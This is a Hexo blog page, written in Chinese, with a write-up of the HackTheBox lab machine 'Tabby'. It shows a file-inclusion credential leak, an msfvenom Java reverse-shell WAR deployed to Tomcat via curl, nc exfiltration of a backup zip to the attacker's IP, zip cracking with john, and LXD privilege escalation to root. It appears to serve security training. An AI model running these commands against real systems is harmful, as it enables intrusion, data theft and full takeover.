@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>tabby | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="nmap scan #### port explore 22 80:80是一个bootstrap themes搭起来的网站 8080:8080是一个tomcat部署成功的默认界面,尝试了默认密码没有成功 #### 目录扫描   先看80端口的readme表明是一个模板创建的，assets目录不允许访问，index.php&#x2F;login好像也不能访问，80端口的news指向了一个megahosting">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tabby">
+<meta property="og:url" content="http://example.com/2022/09/03/tabby/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="nmap scan #### port explore 22 80:80是一个bootstrap themes搭起来的网站 8080:8080是一个tomcat部署成功的默认界面,尝试了默认密码没有成功 #### 目录扫描   先看80端口的readme表明是一个模板创建的，assets目录不允许访问，index.php&#x2F;login好像也不能访问，80端口的news指向了一个megahosting">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/09/03/tabby/nmap.png">
+<meta property="og:image" content="http://example.com/2022/09/03/tabby/80.png">
+<meta property="og:image" content="http://example.com/2022/09/03/tabby/8080.png">
+<meta property="og:image" content="http://example.com/2022/09/03/tabby/info.png">
+<meta property="og:image" content="http://example.com/2022/09/03/tabby/tomcat.png">
+<meta property="og:image" content="http://example.com/2022/09/03/tabby/list.png">
+<meta property="og:image" content="http://example.com/2022/09/03/tabby/upload.png">
+<meta property="og:image" content="http://example.com/2022/09/03/tabby/user.png">
+<meta property="og:image" content="http://example.com/2022/09/03/tabby/zip.png">
+<meta property="og:image" content="http://example.com/2022/09/03/tabby/userflag.png">
+<meta property="og:image" content="http://example.com/2022/09/03/tabby/id.png">
+<meta property="og:image" content="http://example.com/2022/09/03/tabby/lxclist.png">
+<meta property="og:image" content="http://example.com/2022/09/03/tabby/list2.png">
+<meta property="og:image" content="http://example.com/2022/09/03/tabby/list3.png">
+<meta property="og:image" content="http://example.com/2022/09/03/tabby/root.png">
+<meta property="article:published_time" content="2022-09-03T11:43:34.000Z">
+<meta property="article:modified_time" content="2022-09-03T14:04:38.304Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/09/03/tabby/nmap.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-tabby" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/09/03/tabby/" class="article-date">
+  <time class="dt-published" datetime="2022-09-03T11:43:34.000Z" itemprop="datePublished">2022-09-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      tabby
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/03/tabby/nmap.png">
+#### port explore
+22
+80:80是一个bootstrap themes搭起来的网站
+8080:8080是一个tomcat部署成功的默认界面,尝试了默认密码没有成功
+#### 目录扫描
+<img src="/2022/09/03/tabby/80.png">
+<img src="/2022/09/03/tabby/8080.png">
+先看80端口的readme表明是一个模板创建的，assets目录不允许访问，index.php/login好像也不能访问，80端口的news指向了一个megahosting.htb的域名，先将他的信息添加到/etc/hosts中，然后访问，得到一个信息是之前存在一个数据泄漏，但现在已经被移除了
+看8080端口的页面，一个manage需要登录
+#### get tomcat cred
+<img src="/2022/09/03/tabby/info.png">
+根据之前的提示，我们可以尝试文件包含，确认存在文件包含漏洞
+tomcat说users都被定义在/etc/tomcat9/tomcat-users.xml中
+但是没有内容，在搜索后得出tomcat9的配置文件有两个
+usr/share/tomcat9/etc/tomcat-users.xml是另一个配置文件存在的地方
+<img src="/2022/09/03/tabby/tomcat.png">
+得到用户名密码为tomcat-$3cureP4s5w0rd123!
+该用户能登录到host-manager界面
+rolename存在admin-gui和manager-script
+manager-scrript允许我们访问text-based web service located at /manager/text
+尝试访问/manager/text/list
+<img src="/2022/09/03/tabby/list.png">
+这样我们就拥有了部署war包的权限
+使用msfvenom生成一个war
+`msfvenom -p java/shell_reverse_tcp lhost=10.10.14.4 lport=8888 -f war -o rev.10.10.14.4-8888.war`
+传上去试一下
+`curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/abc --upload-file rev.10.10.14.14-8888.war`
+<img src="/2022/09/03/tabby/upload.png">
+访问文件触发,获得了tomcat的权限
+<img src="/2022/09/03/tabby/user.png">
+`python3 -c 'import pty;pty.spawn("bash")'`提升shell模式
+在/var/www/html/files中有一个所有者是ash的backup文件
+用nc把它拷到本地
+`
+cat 16162020_backup.zip | nc 10.10.14.4 9999
+nc -lvnp 9999 > 16162020_backup.zip
+`
+用zip2john创建这个zip的hash
+`zip2john 16162020_backup.zip -o 16162020_backup.zip.john`
+用john破解zip的密码
+<img src="/2022/09/03/tabby/zip.png">
+密码是admin@it
+切换到ash
+<img src="/2022/09/03/tabby/userflag.png">
+#### root
+先尝试sudo -l,发现没有
+传一个linenum.sh上去
+<img src="/2022/09/03/tabby/id.png">
+adm 权限可以读取log files
+#### lxd提权
+创建一个容器挂载到root下面，然后就能够获得root的权限
+<img src="/2022/09/03/tabby/lxclist.png">
+目前该机器上并没有挂载容器
+先下载一个container到本机
+(LXD Alpina Linux image builder)[https://github.com/saghul/lxd-alpine-builder.git]
+这个工具创建了一个LXD Alpina Linux container image 
+把生成的tar.gz传到靶机
+接下来将该镜像导入lxc
+`lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias abcimage`
+`lxd init`
+`lxc init abcimage abccontainer -c security.privileged=true`
+`lxc config device add abccontainer abcdevice disk source=/ path=/mnt/root recursive=true`
+<img src="/2022/09/03/tabby/list2.png">
+`lxc start abccontainer`
+<img src="/2022/09/03/tabby/list3.png">
+`lxc exec abccontainer /bin/sh`
+<img src="/2022/09/03/tabby/root.png">
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/09/03/tabby/" data-id="cl7lzagut00001ecp6mq26uen" data-title="tabby" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/09/04/traverxec/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          traverxec
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/09/03/irked/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">irked</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/09/07/nineveh/">nineveh</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/haircut/">haircut</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/cronos/">cronos</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/06/bastard/">bastard</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/05/popcorn/">popcorn</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
